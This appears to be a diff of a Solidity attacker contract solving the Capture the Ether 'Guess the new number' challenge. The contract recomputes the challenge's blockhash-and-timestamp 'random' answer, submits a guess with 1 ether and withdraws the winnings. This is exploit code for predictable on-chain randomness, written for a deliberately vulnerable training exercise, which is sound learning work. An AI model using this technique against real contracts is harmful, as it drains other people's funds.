@@ -1,29 +1,21 @@
-pragma solidity ^0.7.3;
+pragma solidity ^0.8.9;
 
-interface IGuessTheNewNumberChallenge {
+interface IChallenge {
     function isComplete() external view returns (bool);
-
     function guess(uint8 n) external payable;
 }
 
 contract GuessTheNewNumberAttacker {
-    IGuessTheNewNumberChallenge public challenge;
-    
+    IChallenge private challenge;
     constructor (address challengeAddress) {
-        challenge = IGuessTheNewNumberChallenge(challengeAddress);
+      challenge = IChallenge(challengeAddress);
     }
 
     function attack() external payable {
-      // simulate the same what the challenge contract does
-      require(address(this).balance >= 1 ether, "not enough funds");
-      uint8 answer = uint8(uint256(
-        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
-      ));
-      challenge.guess{value: 1 ether}(answer);
-
-      require(challenge.isComplete(), "challenge not completed");
-      // return all of it to EOA
-      tx.origin.transfer(address(this).balance);
+        uint8 answer =  uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
+        challenge.guess{value:1 ether}(answer);
+        require(challenge.isComplete(),"challenge not completed");
+        payable(msg.sender).transfer(2 ether);
     }
 
     receive() external payable {}
